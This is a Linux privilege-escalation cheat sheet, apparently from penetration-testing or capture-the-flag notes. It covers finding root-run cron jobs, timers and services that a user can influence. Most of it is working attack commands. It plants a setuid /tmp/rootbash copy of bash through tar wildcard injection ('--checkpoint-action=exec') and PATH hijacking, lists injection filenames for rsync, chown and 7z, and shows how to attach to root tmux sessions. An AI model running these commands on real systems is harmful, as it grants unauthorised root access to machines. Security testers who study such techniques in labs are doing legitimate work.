# Root-run files and services

## Find the path
Find a root-run command/file you control; confirm its arguments and trigger.

```bash
ps -eo user,pid,ppid,cmd --forest
find /opt /srv /usr/local/bin /etc/cron.d /etc/systemd/system -xdev -writable -ls 2>/dev/null
stat -Lc '%A %a %U:%G %n' /path/to/root-run-script
namei -l /path/to/root-run-script
getfacl -p /path/to/root-run-script /path/to/parent-directory
```
- Group/ACL access counts, not only world-writable bits. Writing a file ≠ replacing a directory entry.

## Cron / timers / services
```bash
cat /etc/crontab
ls -lah /etc/cron.* /var/spool/cron 2>/dev/null
systemctl list-timers --all
systemctl cat <SERVICE>
systemctl show <SERVICE> -p User -p Group -p ExecStart -p Environment \
  -p EnvironmentFiles -p WorkingDirectory -p FragmentPath -p DropInPaths
```
- Your PATH ≠ the job's PATH: read cron `PATH=` lines and unit/drop-ins.
- systemd `ExecStart` has no shell: pipes/redirects/globs need `sh -c`.

## Relative commands, writable dirs, wildcards
```bash
printf '%s\n' "$PATH"
find / -xdev -type d -writable -ls 2>/dev/null
rg '\*' /etc/cron.* /etc/systemd/system /usr/lib/systemd/system 2>/dev/null
```
- No `rg`: use `grep -R '\*' ...`.

## Dependency the privileged process consumes
| Lead | Confirm |
| --- | --- |
| Writable script | Privileged caller runs it, with which interpreter/args |
| Relative helper command | Caller's PATH reaches your directory first |
| Python import | Module name + import order → [sudo: PYTHONPATH](sudo.md#python-script-with-setenv-pythonpath) |
| Writable config | Caller loads it; when changes apply |
| Wildcard arguments | Expansion directory; filenames aren't always parsed as options |
| Writable shared library | Which library is loaded, search order, trigger |

```bash
./pspy64
```
- pspy: read arguments and timestamps to see what a job really consumes.
- Restoring: if you edit a root-run file, put back original contents + mode before the next run, only if leaving it would break the box.

## Wildcard injection
A root job runs a command with `*` in a directory you can write: filenames become options. Confirm the exact command (`cat /etc/crontab`, script body, `pspy64`) and that the glob expands in *your* directory.

```bash
cd <WRITABLE-DIR>
printf '%s\n' '#!/bin/sh' 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh'
```
After the job runs:
```bash
/tmp/rootbash -p
```
| Root command | Filenames to create |
| --- | --- |
| `tar ... *` | `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh` |
| `rsync ... *` | `-e sh shell.sh` |
| `chown` / `chmod ... *` | `--reference=<FILE-YOU-OWN>` (copies that file's owner/mode onto the targets) |
| `7z ... *` | `@<FILE>` + a symlink named `<FILE>` → target to read |

- `touch -- '<NAME>'`: `--` stops `touch` from parsing the name as an option.
- Needs GNU tar/rsync/etc. and the job running from the writable directory with a **bare** `*` (`cd <DIR> && tar czf x.tgz *`). `/path/dir/*` expands to `/path/dir/--checkpoint=1`, which is not an option; a quoted `"*"` does not expand.
- Remove `shell.sh`, the option-named files and `/tmp/rootbash` afterwards.

## PATH and relative commands in root scripts
Script or cron line calls `service`, `tar`, `cp` … without a full path, and a directory before the system ones in the job's `PATH` is yours (cron `PATH=` line, systemd `Environment=`).

```bash
printf '%s\n' '#!/bin/sh' 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > <WRITABLE-DIR>/<COMMAND>
chmod +x <WRITABLE-DIR>/<COMMAND>
```
- Your interactive `PATH` is irrelevant; read the job's. Default cron `PATH` is `/usr/bin:/bin`, so this works mainly via a script that sets its own `PATH` or a writable system directory.

## Interactive sessions and other leftovers
```bash
ls -la /tmp /var/tmp
ps aux | grep -E 'tmux|screen'
tmux -S /tmp/<SOCKET> attach
screen -ls
```
- A root `tmux`/`screen` session whose socket you can read/write: attach for a root shell. Check `ls -l` on the socket.
- Writable `/etc/update-motd.d/*` runs as root at SSH login → [misc vectors](misc-vectors.md#writable-login-and-config-hooks).
